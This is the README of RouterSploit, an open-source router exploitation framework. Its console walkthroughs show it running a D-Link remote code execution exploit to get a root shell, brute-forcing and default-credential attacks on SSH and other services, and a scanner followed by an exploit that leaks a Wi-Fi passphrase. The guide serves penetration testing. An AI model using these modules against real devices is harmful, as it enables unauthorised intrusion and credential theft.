# RouterSploit - Router Exploitation Framework

The RouteSploit Framework is an open-source exploitation framework dedicated to embedded devices.

It consists of various modules that aids penetration testing operations:

- exploits - modules that take advantage of identified vulnerabilities
- creds - modules designed to test credentials against network services
- scanners - modules that check if target is vulnerable to any exploit

# Installation

	sudo apt-get install python-requests python-paramiko python-netsnmp
	git clone https://github.com/reverse-shell/routersploit
	./rsf.py

# Usage

	root@kalidev:~/git/routersploit# ./rsf.py 
	 ______            _            _____       _       _ _
	 | ___ \          | |          /  ___|     | |     (_) |
	 | |_/ /___  _   _| |_ ___ _ __\ `--. _ __ | | ___  _| |_
	 |    // _ \| | | | __/ _ \ '__|`--. \ '_ \| |/ _ \| | __|
	 | |\ \ (_) | |_| | ||  __/ |  /\__/ / |_) | | (_) | | |_
	 \_| \_\___/ \__,_|\__\___|_|  \____/| .__/|_|\___/|_|\__|
	                                     | |
	     Router Exploitation Framework   |_|

	 Dev Team : Marcin Bury (lucyoa) & Mariusz Kupidura (fwkz)
	 Codename : Wildest Dreams
	 Version  : 1.0.0

	rsf > 

## 1. Exploits

### Pick the module

	rsf > use exploits/
	exploits/2wire/     exploits/asmax/     exploits/asus/      exploits/cisco/     exploits/dlink/     exploits/fortinet/  exploits/juniper/   exploits/linksys/   exploits/multi/     exploits/netgear/
	rsf > use exploits/dlink/dir_300_600_rce
	rsf (D-LINK DIR-300 & DIR-600 RCE) > 

U can use tab key for completion.

### Options

Display module options:

	rsf (D-LINK DIR-300 & DIR-600 RCE) > show options

	Target options:


	   Name       Current settings     Description                                
	   ----       ----------------     -----------                                
	   target                          Target address e.g. http://192.168.1.1     
	   port       80                   Target Port

Set options:

	rsf (D-LINK DIR-300 & DIR-600 RCE) > set target http://192.168.1.1
	[+] {'target': 'http://192.168.1.1'}

### Run module

Exploiting target can be achieved by issuing 'run' or 'exploit' command:

	rsf (D-LINK DIR-300 & DIR-600 RCE) > run
	[+] Target is vulnerable
	[*] Invoking command loop...
	cmd > whoami
	root

It is also possible to check if the target is vulnerable to particular exploit:

	rsf (D-LINK DIR-300 & DIR-600 RCE) > check
	[+] Target is vulnerable

### Info

Display information about exploit:

	rsf (D-LINK DIR-300 & DIR-600 RCE) > show info

	Name:
	D-LINK DIR-300 & DIR-600 RCE

	Description:
	Module exploits D-Link DIR-300, DIR-600 Remote Code Execution vulnerability which allows executing command on operating system level with root privileges.

	Targets:
	- D-Link DIR 300
	- D-Link DIR 600

	Authors:
	- Michael Messner <devnull[at]s3cur1ty.de> # vulnerability discovery
	- Marcin Bury <marcin.bury[at]reverse-shell.com> # routersploit module

	References:
	- http://www.dlink.com/uk/en/home-solutions/connect/routers/dir-600-wireless-n-150-home-router
	- http://www.s3cur1ty.de/home-network-horror-days
	- http://www.s3cur1ty.de/m1adv2013-003

## 2. Creds

### Pick module

Modules located under creds/ directory allow running dictionary attacks against various network services.

Following services are currently supported:

- ftp
- ssh
- telnet
- http basic auth
- http form auth
- snmp

Every service has been divided into two modules:

- default (e.g. ssh_default) - this kind of modules use one wordlist with default credentials pairs login:password. Module can be quickly used and in matter of seconds verify if the device uses default credentials.  
- bruteforce (e.g. ssh_bruteforce) - this kind of modules perform dictionary attacks against specified account or list of accounts. It takes two parameters login and password. These values can be a single word (e.g. 'admin') or entire list of strings (file:///root/users.txt).

Console:

    rsf > use creds/
    creds/ftp_bruteforce         creds/http_basic_bruteforce  creds/http_form_bruteforce   creds/snmp_bruteforce        creds/ssh_default            creds/telnet_default         
    creds/ftp_default            creds/http_basic_default     creds/http_form_default      creds/ssh_bruteforce         creds/telnet_bruteforce      
    rsf > use creds/ssh_default
    rsf (SSH Default Creds) > 

### Options

    rsf (SSH Default Creds) > show options
    
    Target options:
    
       Name       Current settings     Description           
       ----       ----------------     -----------           
       target                          Target IP address     
       port       22                   Target port           
    
    
    Module options:
    
       Name         Current settings                                                      Description                                              
       ----         ----------------                                                      -----------                                              
       threads      8                                                                     Numbers of threads                                       
       defaults     file:///root/git/routersploit/routersploit/wordlists/defaults.txt     User:Pass or file with default credentials (file://)


Set target:

    rsf (SSH Default Creds) > set target 192.168.1.53
    [+] {'target': '192.168.1.53'}


### Run module

    rsf (SSH Default Creds) > run
    [*] Running module...
    [*] worker-0 process is starting...
    [*] worker-1 process is starting...
    [*] worker-2 process is starting...
    [*] worker-3 process is starting...
    [*] worker-4 process is starting...
    [*] worker-5 process is starting...
    [*] worker-6 process is starting...
    [*] worker-7 process is starting...
    [-] worker-4 Authentication failed. Username: '3comcso' Password: 'RIP000'
    [-] worker-1 Authentication failed. Username: '1234' Password: '1234'
    [-] worker-0 Authentication failed. Username: '1111' Password: '1111'
    [-] worker-7 Authentication failed. Username: 'ADVMAIL' Password: 'HP'
    [-] worker-3 Authentication failed. Username: '266344' Password: '266344'
    [-] worker-2 Authentication failed. Username: '1502' Password: '1502'
	
    (..)

    Elapsed time:  38.9181981087 seconds
    [+] Credentials found!
	
    Login     Password     
    -----     --------     
    admin     1234         

    rsf (SSH Default Creds) > 
	
## 3. Scanners

Scanners allow quickly verify if the target is vulnerable to any exploits.

### Pick module

    rsf > use scanners/dlink_scan
    rsf (D-Link Scanner) > show options


### Options

    Target options:
    
       Name       Current settings     Description                                
       ----       ----------------     -----------                                
       target                          Target address e.g. http://192.168.1.1     
       port       80                   Target port                                

Set target:

    rsf (D-Link Scanner) > set target 192.168.1.1
    [+] {'target': '192.168.1.1'}

### Run module

    rsf (D-Link Scanner) > run
    [+] exploits/dlink/dwr_932_info_disclosure is vulnerable
    [-] exploits/dlink/dir_300_320_615_auth_bypass is not vulnerable
    [-] exploits/dlink/dsl_2750b_info_disclosure is not vulnerable
    [-] exploits/dlink/dns_320l_327l_rce is not vulnerable
    [-] exploits/dlink/dir_645_password_disclosure is not vulnerable
    [-] exploits/dlink/dir_300_600_615_info_disclosure is not vulnerable
    [-] exploits/dlink/dir_300_600_rce is not vulnerable
    
    [+] Device is vulnerable!
     - exploits/dlink/dwr_932_info_disclosure

It has been verified that target is vulnerable to dwr\_932\_info\_disclosure exploit. Now use proper module and exploit target.

    rsf (D-Link Scanner) > use exploits/dlink/dwr_932_info_disclosure
    rsf (D-Link DWR-932 Info Disclosure) > set target 192.168.1.1
    [+] {'target': '192.168.1.1'}
    rsf (D-Link DWR-932 Info Disclosure) > exploit
    [*] Running module...
    [*] Decoding JSON value
    [+] Exploit success
    
       Parameter                  Value                                                                                                 
       ---------                  -----                                                                                                 
       get_wps_enable             0                                                                                                     
       wifi_AP1_enable            1                                                                                                     
       get_client_list            9c:00:97:00:a3:b3,192.168.0.45,IT-PCs,0>40:b8:00:ab:b8:8c,192.168.0.43,android-b2e363e04fb0680d,0     
       wifi_AP1_ssid              dlink-DWR-932                                                                                         
       get_mac_address            c4:00:f5:00:ec:40                                                                                     
       wifi_AP1_security_mode     3208,8                                                                                                
       wifi_AP1_hidden            0                                                                                                     
       get_mac_filter_switch      0                                                                                                     
       wifi_AP1_passphrase        MyPaSsPhRaSe                                                                                          
       get_wps_mode               0
    
# License

License has been taken from BSD licensing and applied to RouterSploit Framework.
Please see LICENSE for more details.

